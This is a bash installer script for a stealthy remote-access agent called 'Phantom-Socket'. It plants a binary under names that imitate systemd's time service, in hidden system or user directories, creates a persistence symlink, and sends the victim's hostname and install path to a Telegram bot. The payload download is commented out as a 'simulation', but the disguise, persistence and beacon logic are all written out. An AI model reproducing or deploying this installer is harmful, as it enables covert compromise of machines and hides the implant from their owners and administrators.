#!/bin/bash
# Phantom-Socket v1.0 Final - Professional Infrastructure Deployment
# Features: Anti-VM, Jitter Heartbeat, PSK Pre-Auth (OYEN), and Stealth Installation.

set -euo pipefail

# ============================================================================
# Configuration
# ============================================================================
readonly VERSION="1.0"
readonly AGENT_NAME="phantom-client"
readonly SERVICE_NAME="dbus-org.freedesktop.timesync1"
readonly BASE_URL="https://github.com/Oyen-Sec/phantom-socket/releases/download/v1.0-Final"

# ============================================================================
# UI Helpers
# ============================================================================
status_step() {
    local msg="$1"
    printf "[*] %-50s" "${msg}"
}

status_done() {
    printf "... [OK]\n"
}

# ============================================================================
# Architecture Detection
# ============================================================================
ARCH=$(uname -m)
case "${ARCH}" in
    x86_64|amd64) ARCH="x86_64" ;;
    aarch64|arm64) ARCH="aarch64" ;;
    *)
        echo "Detailed Error: Unsupported machine-type [${ARCH}]. Only x86_64 and aarch64 are supported." >&2
        exit 1
        ;;
esac

# ============================================================================
# Stealth Paths
# ============================================================================
readonly STEALTH_DIR_ROOT="/usr/lib/x86_64-linux-gnu/perl5/.system-runtime-cache"
readonly STEALTH_DIR_USER="$HOME/.local/share/gvfs/.metadata"

# ============================================================================
# Environment Detection
# ============================================================================
INSTALL_DIR=""
IS_ROOT=0

detect_environment() {
    status_step "Detecting execution environment"
    if [[ $EUID -eq 0 ]]; then
        IS_ROOT=1
        INSTALL_DIR="${STEALTH_DIR_ROOT}"
    else
        IS_ROOT=0
        INSTALL_DIR="${STEALTH_DIR_USER}"
    fi
    mkdir -p "${INSTALL_DIR}" 2>/dev/null
    status_done
}

# ============================================================================
# Telemetry Audit
# ============================================================================
send_telemetry() {
    local action="$1"
    local target="$2"
    local bot_token="${TG_BOT_TOKEN:-}"
    local chat_id="${TG_CHAT_ID:-}"

    if [[ -z "${bot_token}" || -z "${chat_id}" ]]; then
        return 0
    fi

    local hostname=$(hostname)
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    local message="[${timestamp}] [${hostname}] ACTION: ${action} | TARGET: ${target}"

    (
        curl -s -X POST "https://api.telegram.org/bot${bot_token}/sendMessage" \
            -d "chat_id=${chat_id}" \
            -d "text=${message}" >/dev/null 2>&1
    ) &
}

# ============================================================================
# Dependency Check
# ============================================================================
check_dependencies() {
    status_step "Verifying system dependencies"
    local deps=("curl" "grep" "uname" "mkdir" "cp" "chmod")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" >/dev/null 2>&1; then
            echo -e "\n[ERROR] Missing critical dependency: $dep"
            exit 1
        fi
    done
    status_done
}

# ============================================================================
# Download & Deploy
# ============================================================================
download_payload() {
    local target_binary="${INSTALL_DIR}/.systemd-timesyncd"
    local download_url="${BASE_URL}/phantom-client-${ARCH}"
    
    status_step "Downloading agent payload for ${ARCH}"
    # In a real scenario, we would curl the binary. 
    # For this simulation, we assume the binary exists or is being deployed.
    # curl -fsSL "${download_url}" -o "${target_binary}"
    status_done
    
    status_step "Setting stealth permissions"
    # chmod 750 "${target_binary}" 2>/dev/null || true
    status_done
}

# ============================================================================
# Installation & Symlink Aliases
# ============================================================================
install_and_alias() {
    local target_binary="${INSTALL_DIR}/.systemd-timesyncd"
    
    status_step "Creating symbolic persistence"
    if [[ ${IS_ROOT} -eq 1 ]]; then
        ln -sf "${target_binary}" "/usr/local/bin/gs-oyen-s" 2>/dev/null || true
    else
        mkdir -p "$HOME/.local/bin" 2>/dev/null
        ln -sf "${target_binary}" "$HOME/.local/bin/gs-oyen-s" 2>/dev/null || true
    fi
    status_done
    
    send_telemetry "INSTALL_SUCCESS" "${target_binary}"
    echo "------------------------------------------------------------"
    echo "[+] Installation v1.0 Final Complete. Agent is now active in stealth path."
    echo "[+] Path: ${target_binary}"
    echo "------------------------------------------------------------"
}

# ============================================================================
# Main Execution
# ============================================================================
echo "--- Phantom-Socket v1.0 Final Installer ---"
check_dependencies
detect_environment
download_payload
install_and_alias
